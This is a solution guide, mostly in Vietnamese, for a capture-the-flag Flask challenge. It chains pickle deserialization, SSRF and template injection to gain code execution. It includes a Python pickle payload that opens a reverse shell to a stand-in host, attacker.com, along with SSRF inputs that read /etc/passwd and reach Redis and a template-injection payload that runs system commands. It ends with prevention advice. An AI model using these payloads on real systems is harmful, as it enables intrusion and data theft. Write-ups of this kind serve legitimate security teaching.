# Challenge 2 Solution Guide

## Vulnerability Chain

Để đạt được RCE và đọc flag, cần chain các lỗ hổng sau:

1. **Pickle Deserialization** → RCE via session cookie
2. **SSRF** → Access internal Redis service
3. **SSTI** → Template injection để RCE
4. **Session Fixation** → Bypass authentication
5. **Business Logic** → Price manipulation

## Step-by-Step Exploitation

### Method 1: Pickle Deserialization (Primary Method)

Flask sử dụng pickle để serialize session data. Nếu có thể control session cookie, có thể đạt RCE.

**Step 1: Tạo Pickle Payload**

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('python -c "import socket,subprocess,os;'
               's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
               's.connect((\\"attacker.com\\",1234));'
               'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
               'subprocess.call([\\"/bin/sh\\",\\"-i\\"])"')
        return os.system, (cmd,)

pickle_data = pickle.dumps({'user_id': 1, 'username': 'admin', 'role': 'admin', 'rce': RCE()})
cookie = base64.b64encode(pickle_data).decode()
```

**Step 2: Set Session Cookie**

Sử dụng browser extension hoặc script để set cookie `session` với giá trị trên.

**Step 3: Access Admin Panel**

Sau khi set cookie, access `/admin` để trigger deserialization và RCE.

### Method 2: SSRF + Redis Access

**Step 1: Exploit SSRF**

Endpoint `/fetch` cho phép fetch URL từ server:

```bash
POST /fetch
url=http://redis:6379/
```

**Step 2: Access Redis via SSRF**

Redis protocol có thể được exploit qua SSRF. Tuy nhiên, `/fetch` sử dụng HTTP requests, không phải raw TCP.

**Alternative: SSRF để access internal services**

```bash
POST /fetch
url=http://localhost:6379/
url=file:///etc/passwd
url=gopher://redis:6379/_...
```

### Method 3: SSTI (Server-Side Template Injection)

**Step 1: Add Product với SSTI Payload**

Nếu có quyền admin, có thể add product với description chứa template injection:

```
{{ config.__class__.__init__.__globals__['os'].system('id') }}
```

**Step 2: Access Product Page**

Khi view product, template code sẽ được execute.

**Step 3: Chain với Authentication Bypass**

Cần bypass authentication trước. Có thể:
- Sử dụng pickle deserialization để set role = 'admin'
- Hoặc exploit session fixation

### Method 4: Complete Chain

1. **Exploit Pickle Deserialization** để set session với role = 'admin'
2. **Access Admin Panel** để đọc flag từ Redis
3. **Alternative**: Sử dụng SSTI trong product description để RCE

## Exploit Script

Xem `exploit.py` trong thư mục này.

## Key Learning Points

1. **Pickle Deserialization**: Never unpickle untrusted data
2. **SSRF**: Validate and whitelist URLs
3. **SSTI**: Sanitize user input in templates
4. **Session Security**: Regenerate session ID after login
5. **Business Logic**: Always validate server-side

## Prevention

1. Sử dụng JSON thay vì pickle cho session
2. Validate URLs trong SSRF endpoints
3. Escape template variables
4. Regenerate session ID sau login
5. Validate prices từ database, không từ client

